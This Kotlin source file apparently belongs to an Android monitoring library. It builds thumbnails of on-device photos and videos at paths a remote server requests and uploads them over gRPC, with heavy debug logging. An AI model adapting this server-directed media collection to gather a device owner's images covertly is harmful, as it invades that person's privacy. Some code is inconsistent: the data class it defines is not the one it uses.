package com.hawkshaw.library.features.media.filecrud

import android.graphics.Bitmap
import android.graphics.BitmapFactory
import androidx.exifinterface.media.ExifInterface
import android.media.MediaMetadataRetriever
import android.media.ThumbnailUtils
import android.net.Uri
import android.os.Build
import android.provider.MediaStore
import android.util.Log // Added for Android logging
import androidx.annotation.RequiresApi
import com.hawkshaw.library.App
import com.hawkshaw.library.datalayer.Injector
import com.hawkshaw.library.datalayer.models.GetPendingThumbnailsResponse
// Assuming GrpcResponse is correctly imported if needed by other parts of the file
import com.hawkshaw.library.datalayer.network.grpc.GrpcResponse
import com.hawkshaw.library.datalayer.network.twirp.ApiResponse
import com.hawkshaw.library.logger.Logger
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.flow.collect
import kotlinx.coroutines.withContext
import java.io.ByteArrayOutputStream
import java.io.File
import androidx.core.graphics.scale


private const val TAG = "ThumbnailsUtilsNew"

/**
 * Process a single thumbnail extraction.
 *
 * @param file The file from which to extract the thumbnail.
 * @param byteArrayOutputStream A ByteArrayOutputStream to use for converting Bitmap to ByteArray.
 * @return The thumbnail as a ByteArray, or null if extraction fails.
 */
@RequiresApi(Build.VERSION_CODES.O)
private suspend fun getThumbnail(file: File, byteArrayOutputStream: ByteArrayOutputStream): ByteArray? = withContext(Dispatchers.IO) {
    Log.d(TAG, "[DEBUG] getThumbnail called for file: ${file.path}")
    if (!file.exists() || !file.isFile) {
        Log.w(TAG, "[DEBUG] File not found or is not a file for thumbnail: ${file.path}")
        Logger.w(TAG, "File not found or is not a file for thumbnail: ${file.path}")
        return@withContext null
    }

    val result = when {
        file.path.endsWith(".jpg", ignoreCase = true) ||
        file.path.endsWith(".jpeg", ignoreCase = true) ||
        file.path.endsWith(".png", ignoreCase = true) -> {
            Log.d(TAG, "[DEBUG] Identified as image: ${file.path}. Calling getImageThumbnail.")
            getImageThumbnail(file, byteArrayOutputStream)
        }

        file.path.endsWith(".mp4", ignoreCase = true) ||
        file.path.endsWith(".3gp", ignoreCase = true) ||
        file.path.endsWith(".webm", ignoreCase = true) ||
        file.path.endsWith(".mkv", ignoreCase = true) -> {
            Log.d(TAG, "[DEBUG] Identified as video: ${file.path}. Calling getVideoThumbnail.")
            getVideoThumbnail(file, byteArrayOutputStream)
        }

        else -> {
            Log.w(TAG, "[DEBUG] Unsupported file type for thumbnail: ${file.path}")
            Logger.d(TAG, "Unsupported file type for thumbnail: ${file.path}", false, 4, null)
            null
        }
    }
    Log.d(TAG, "[DEBUG] getThumbnail for ${file.path} result size: ${result?.size ?: "null"}")
    return@withContext result
}

/**
 * Extract a thumbnail from an image file.
 *
 * @param file The image file.
 * @param byteArrayOutputStream A ByteArrayOutputStream for conversion.
 * @return The thumbnail as a ByteArray, or null.
 */
@RequiresApi(Build.VERSION_CODES.O)
private fun getImageThumbnail(file: File, byteArrayOutputStream: ByteArrayOutputStream): ByteArray? {
    Log.d(TAG, "[DEBUG] getImageThumbnail called for file: ${file.path}")
    val exifInterface = try {
        Log.d(TAG, "[DEBUG] Attempting to read EXIF for ${file.path}")
        ExifInterface(file.path)
    } catch (e: Exception) {
        Log.w(TAG, "[DEBUG] Failed to initialize ExifInterface for ${file.path}: ${e.message}")
        Logger.v(TAG, "Failed to read EXIF for ${file.path}: ${e.message}", false, 4, null)
        null
    }

    val bitmap = if (exifInterface != null && exifInterface.hasThumbnail()) {
        Log.d(TAG, "[DEBUG] EXIF thumbnail found for ${file.path}. Extracting thumbnailBitmap.")
        exifInterface.thumbnailBitmap
    } else {
        Log.d(TAG, "[DEBUG] No EXIF thumbnail for ${file.path} or exifInterface is null. Attempting to decode full image.")
        try {
            BitmapFactory.decodeFile(file.path)?.let { fullBitmap ->
                Log.d(TAG, "[DEBUG] Full image decoded for ${file.path}. Original size: ${fullBitmap.width}x${fullBitmap.height}. Extracting thumbnail (128x128).")
                val thumbnail = ThumbnailUtils.extractThumbnail(fullBitmap, 128, 128)
                Log.d(TAG, "[DEBUG] Thumbnail extracted from full image. Size: ${thumbnail?.width}x${thumbnail?.height}. Recycling full bitmap.")
                fullBitmap.recycle()
                thumbnail
            }
        } catch (e: Exception) {
            Log.e(TAG, "[DEBUG] Error decoding/extracting image thumbnail from ${file.path}: ${e.message}", e)
            Logger.v(TAG, "Error extracting image thumbnail from ${file.path}: ${e.message}", false, 4,  null)
            null
        }
    }

    return if (bitmap != null) {
        Log.d(TAG, "[DEBUG] Bitmap obtained for ${file.path}. Converting to byte array.")
        val byteArray = toByteArray(bitmap, byteArrayOutputStream)
        Log.d(TAG, "[DEBUG] getImageThumbnail: Byte array created for ${file.path}, size: ${byteArray.size}")
        byteArray
    } else {
        Log.w(TAG, "[DEBUG] No bitmap could be obtained for image thumbnail: ${file.path}")
        null
    }
}

/**
 * Extract a thumbnail from a video file.
 *
 * @param file The video file.
 * @param byteArrayOutputStream A ByteArrayOutputStream for conversion.
 * @return The thumbnail as a ByteArray, or null.
 */
private fun getVideoThumbnail(file: File, byteArrayOutputStream: ByteArrayOutputStream): ByteArray? {
    Log.d(TAG, "[DEBUG] getVideoThumbnail called for file: ${file.path}")
    val mediaMetadataRetriever = MediaMetadataRetriever()
    var finalByteArray: ByteArray? = null

    try {
        Log.d(TAG, "[DEBUG] Setting data source for MediaMetadataRetriever: ${Uri.fromFile(file)}")
        mediaMetadataRetriever.setDataSource(App.getContext(), Uri.fromFile(file))
        Log.d(TAG, "[DEBUG] Attempting to get frame at time (1000us) for ${file.path}")
        val frameAtTime = mediaMetadataRetriever.getFrameAtTime(1000, MediaMetadataRetriever.OPTION_CLOSEST_SYNC)
            ?: throw Exception("No frame found for video thumbnail")
        Log.d(TAG, "[DEBUG] Frame retrieved for ${file.path}. Original size: ${frameAtTime.width}x${frameAtTime.height}. Scaling to 128x128.")

        val bitmap = frameAtTime.scale(128, 128, false)
        frameAtTime.recycle()
        Log.d(TAG, "[DEBUG] Frame scaled and original recycled. Converting to byte array.")

        finalByteArray = toByteArray(bitmap, byteArrayOutputStream)
        Log.d(TAG, "[DEBUG] getVideoThumbnail: Byte array created via MMR for ${file.path}, size: ${finalByteArray.size}")

    } catch (e: Exception) {
        Log.e(TAG, "[DEBUG] MediaMetadataRetriever error for ${file.path}: ${e.message}", e)
        Logger.v(TAG, "Video MMR error for ${file.path}: ${e.message}", false, 4, null)

        Log.d(TAG, "[DEBUG] Fallback: Attempting ThumbnailUtils.createVideoThumbnail for ${file.path}")
        try {
            val bitmap = ThumbnailUtils.createVideoThumbnail(file.path, MediaStore.Images.Thumbnails.MINI_KIND)
            if (bitmap != null) {
                Log.d(TAG, "[DEBUG] ThumbnailUtils.createVideoThumbnail succeeded for ${file.path}. Size: ${bitmap.width}x${bitmap.height}. Converting to byte array.")
                finalByteArray = toByteArray(bitmap, byteArrayOutputStream)
                Log.d(TAG, "[DEBUG] getVideoThumbnail: Byte array created via ThumbnailUtils for ${file.path}, size: ${finalByteArray?.size}")
            } else {
                Log.w(TAG, "[DEBUG] ThumbnailUtils.createVideoThumbnail returned null for ${file.path}")
            }
        } catch (tuException: Exception) {
            Log.e(TAG, "[DEBUG] ThumbnailUtils.createVideoThumbnail error for ${file.path}: ${tuException.message}", tuException)
            Logger.v(TAG, "Video TU error for ${file.path}: ${tuException.message}", false, 4, null)
        }
    } finally {
        Log.d(TAG, "[DEBUG] Releasing MediaMetadataRetriever for ${file.path}")
        try {
            mediaMetadataRetriever.release()
            Log.d(TAG, "[DEBUG] MediaMetadataRetriever released successfully for ${file.path}")
        } catch (releaseEx: Exception) {
            Log.e(TAG, "[DEBUG] Error releasing MediaMetadataRetriever: ${releaseEx.message}", releaseEx)
            Logger.e(TAG, "Error releasing MediaMetadataRetriever: ${releaseEx.message}", releaseEx, false, 12, null)
        }
    }
    Log.d(TAG, "[DEBUG] getVideoThumbnail for ${file.path} returning byte array of size: ${finalByteArray?.size ?: "null"}")
    return finalByteArray
}

/**
 * Convert a bitmap to a byte array using the provided OutputStream.
 *
 * @param bitmap The Bitmap to convert.
 * @param byteArrayOutputStream The OutputStream to use for compression.
 * @return The ByteArray representation of the Bitmap.
 */
private fun toByteArray(bitmap: Bitmap, byteArrayOutputStream: ByteArrayOutputStream): ByteArray {
    Log.d(TAG, "[DEBUG] toByteArray called for bitmap: $bitmap")
    byteArrayOutputStream.reset()
    Log.d(TAG, "[DEBUG] toByteArray: Stream reset. Compressing bitmap to PNG, quality 90.")
    bitmap.compress(Bitmap.CompressFormat.PNG, 90, byteArrayOutputStream)
    Log.d(TAG, "[DEBUG] toByteArray: Bitmap compressed. Recycling bitmap.")
    bitmap.recycle()
    val byteArray = byteArrayOutputStream.toByteArray()
    Log.d(TAG, "[DEBUG] toByteArray: Byte array created, size: ${byteArray.size}")
    return byteArray
}

/**
 * Get thumbnails for a list of file paths.
 * Note: This function `getFiles` is declared but not used in the `pushThumbnailsNew` provided.
 */
@RequiresApi(Build.VERSION_CODES.O)
private suspend fun getFiles(paths: List<String>) = withContext(Dispatchers.IO) {
    Log.d(TAG, "[DEBUG] getFiles called with ${paths.size} paths.")
    val result = mutableMapOf<String, ByteArray?>()
    val outputStream = ByteArrayOutputStream()

    for (path in paths) {
        Log.d(TAG, "[DEBUG] getFiles: Processing path: $path")
        val file = File(path)
        if (!file.exists() || !file.isFile) {
            Log.w(TAG, "[DEBUG] getFiles: File does not exist or is not a file: $path")
            result[path] = null
            continue
        }

        val thumbnail = getThumbnail(file, outputStream)
        Log.d(TAG, "[DEBUG] getFiles: Thumbnail for $path size: ${thumbnail?.size ?: "null"}. Adding to result.")
        result[path] = thumbnail
    }
    Log.d(TAG, "[DEBUG] getFiles finished. Result map size: ${result.size}")
    return@withContext result
}

/**
 * Process and push thumbnails for pending files.
 */
@RequiresApi(Build.VERSION_CODES.O)
suspend fun pushThumbnailsNew(): ApiResponse<Unit> = withContext(Dispatchers.IO) {
    Log.d(TAG, "[DEBUG] pushThumbnailsNew called.")
    val byteArrayOutputStream = ByteArrayOutputStream()

    try {
        Log.d(TAG, "[DEBUG] Getting pending thumbnails from mediaService.")
        val pendingResponse = Injector.INSTANCE.mediaService.getPendingThumbnails()
        Log.d(TAG, "[DEBUG] Received pending thumbnails response: $pendingResponse")

        when (pendingResponse) {
            is ApiResponse.Success<GetPendingThumbnailsResponse> -> {
                val responseData = pendingResponse.result
                Log.d(TAG, "[DEBUG] Successfully fetched pending thumbnails. Count: ${responseData.paths.size}")
                val pendingPaths = responseData.paths

                if (pendingPaths.isEmpty()) {
                    Log.d(TAG, "[DEBUG] No pending thumbnails to process.")
                    Logger.d(TAG, "No pending thumbnails to process", false, 4, null)
                    return@withContext ApiResponse.Success(Unit)
                }

                Log.d(TAG, "[DEBUG] Processing ${pendingPaths.size} pending thumbnails.")
                Logger.d(TAG, "Processing ${pendingPaths.size} pending thumbnails", false, 4, null)

                val thumbnailsMap = mutableMapOf<String, ByteArray>()
                for (path in pendingPaths) {
                    Log.d(TAG, "[DEBUG] Generating thumbnail for pending path: $path")
                    val file = File(path)
                    if (!file.exists() || !file.isFile) {
                        Log.w(TAG, "[DEBUG] File does not exist for pending path: $path, skipping.")
                        Logger.v(TAG, "File does not exist: $path, skipping thumbnail generation.", false, 4, null)
                        continue
                    }

                    val thumbnail = getThumbnail(file, byteArrayOutputStream)
                    if (thumbnail != null) {
                        Log.d(TAG, "[DEBUG] Thumbnail generated for $path, size: ${thumbnail.size}. Adding to map.")
                        thumbnailsMap[path] = thumbnail
                    } else {
                        Log.w(TAG, "[DEBUG] Thumbnail generation failed for pending path: $path")
                    }
                }
                Log.d(TAG, "[DEBUG] Finished generating all pending thumbnails. Map size: ${thumbnailsMap.size}")

                val uploadRequest = com.hawkshaw.library.features.media.filecrud.ThumbnailUploadRequest(
                    thumbnails = thumbnailsMap,
                    paths = pendingPaths
                )
                Log.d(TAG, "[DEBUG] Prepared ThumbnailUploadRequest: $uploadRequest")

                Log.d(TAG, "[DEBUG] Uploading thumbnails via fileService.")
                val uploadResponseFlow = Injector.INSTANCE.fileService.uploadThumbnails(uploadRequest)
                var overallUploadSuccess = true

                Log.d(TAG, "[DEBUG] Collecting responses from uploadResponseFlow.")
                uploadResponseFlow.collect { grpcResponse ->
                    Log.d(TAG, "[DEBUG] Received GrpcResponse from flow: $grpcResponse")
                    when (grpcResponse) {
                        is com.hawkshaw.library.datalayer.network.grpc.GrpcResponse.Success -> {
                            // Corrected: Log the grpcResponse object or a generic success message
                            Log.d(TAG, "[DEBUG] Part of thumbnail upload successful. GrpcResponse: $grpcResponse")
                            Logger.d(TAG, "Part of thumbnail upload successful.", false, 4, null)
                        }
                        is com.hawkshaw.library.datalayer.network.grpc.GrpcResponse.Error -> {
                            // Corrected: Removed .code, log grpcResponse.error or just its message
                            Log.e(TAG, "[DEBUG] Part of thumbnail upload failed. Error message: ${grpcResponse.error.message}")
                            Logger.e(TAG, "Part of thumbnail upload failed: ${grpcResponse.error.message}",
                                throwable = null, b = false, i = 12, nothing = null)
                            overallUploadSuccess = false
                        }
                        is com.hawkshaw.library.datalayer.network.grpc.GrpcResponse.InProgress -> {
                            // Corrected: Log the grpcResponse object or a generic in-progress message
                            Log.d(TAG, "[DEBUG] Thumbnail upload part in progress. GrpcResponse: $grpcResponse")
                            Logger.d(TAG, "Thumbnail upload part in progress.", false,4,null)
                        }
                        is com.hawkshaw.library.datalayer.network.grpc.GrpcResponse.Default -> {
                            Log.d(TAG, "[DEBUG] Thumbnail upload part default state. GrpcResponse: $grpcResponse")
                            Logger.d(TAG, "Thumbnail upload part default state.", false,4,null)
                        }
                    }
                }
                Log.d(TAG, "[DEBUG] Finished collecting from uploadResponseFlow. Overall success: $overallUploadSuccess")
                return@withContext if (overallUploadSuccess) ApiResponse.Success(Unit) else ApiResponse.Error("Some thumbnail uploads failed")
            }
            is ApiResponse.Error<*> -> {
                Log.e(TAG, "[DEBUG] Failed to get pending thumbnails. Error: ${pendingResponse.errorMessage}")
                Logger.e(
                    TAG,
                    "Failed to get pending thumbnails: ${pendingResponse.errorMessage}",
                    throwable = null, b = false, i = 12, nothing = null)
                return@withContext ApiResponse.Error(pendingResponse.errorMessage ?: "Unknown error fetching pending thumbnails")
            }
            is ApiResponse.InProgress<*> -> {
                Log.d(TAG, "[DEBUG] Pending thumbnails request in progress (ignoring).")
                Logger.d(TAG, "Pending thumbnails request in progress (ignoring)", false, 4, null)
                return@withContext ApiResponse.InProgress<Unit>()
            }
            else -> {
                Log.e(TAG, "[DEBUG] Received unexpected pending thumbnails response type: ${pendingResponse::class.simpleName}")
                Logger.e(
                    TAG,
                    "Received unexpected pending thumbnails response type: ${pendingResponse::class.simpleName}",
                    throwable = null, b = false, i = 12, nothing = null)
                return@withContext ApiResponse.Error("Unexpected response type from getPendingThumbnails")
            }
        }
    } catch (e: Exception) {
        Log.e(TAG, "[DEBUG] Exception during thumbnail processing: ${e.message}", e)
        Logger.e(TAG, "Exception during thumbnail processing: ${e.message}", e, false, 12, null)
        return@withContext ApiResponse.Error(e.message ?: "Unknown error during thumbnail processing")
    } finally {
        Log.d(TAG, "[DEBUG] Resetting byteArrayOutputStream in finally block.")
        byteArrayOutputStream.reset()
    }
}

/**
 * Data class representing a thumbnail upload request.
 * This class is separate from the one in ThumbnailsUtilsKt.kt (ThumbnailUploadRequest)
 * and is specifically used within the `pushThumbnailsNew` context.
 */
data class ThumbnailUploadRequestNew(
    val thumbnails: Map<String, ByteArray>,
    val paths: List<String>
)
